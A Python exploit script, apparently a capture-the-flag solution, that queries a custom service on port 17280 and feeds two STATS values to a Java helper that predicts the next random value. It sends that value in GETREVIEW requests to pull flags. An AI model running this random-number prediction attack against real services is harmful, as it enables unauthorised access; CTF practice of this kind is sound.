import socket
import subprocess
import sys
import os



def exploit(target):
    HOST = target
    PORT = 17280
    ADDRESS = (HOST, PORT)
    print('[+] Starting Exploit')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(ADDRESS)
    print('[+] Sending LIST')
    s.send(b'LIST 0\n')
    data = s.recv(2048).decode("utf-8")
    data = data.split(" ")[1]
    data = data.split(",")
    print(f'[+] Received {data}')
    for id in data:
        id = id.strip()
        print(f'[+] Using {id}')
        print('[+] Sending STATS')
        s.send(b'STATS\n')
        response = s.recv(2048).decode("utf-8")
        print(f'[+] First Stats Block: {response}')
        response = response.split(" ")
        val1 = response[1]
        s.send(b'STATS\n')
        response = s.recv(2048).decode("utf-8")
        print(f'[+] Second Stats Block: {response}')
        response = response.split(" ")
        val2 = response[1]
        print(f'[+] Received {val1} and {val2}')
        print('[+] Starting Java Reverse')
        res = subprocess.run(["/opt/jdk-19.0.1/bin/java", "-jar", "./random_reverse.jar", val1, val2], capture_output=True, text=True, cwd=os.path.dirname(os.path.realpath(__file__)))
        error = res.stderr
        res = res.stdout
        print(f'[+] Returned {res}')
        if "VALUE" not in res:
            print(error)
            print("Error, didn't return random value")
            return
        res = res.split(" ")[1]
        print('[+] Resetting Challenge with invalid GETREVIEW')
        s.send(b'GETREVIEW 1:1\n')
        _ = s.recv(2048).decode("utf-8")
        payload = f"GETREVIEW {id}:{res}\n"
        print(f'[+] Sending {payload}')
        s.send(bytes(payload, 'utf-8'))
        flag = s.recv(2048).decode("utf-8")
        print(f'[+] Received {flag}')
        print(flag)
    s.close()



if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost')
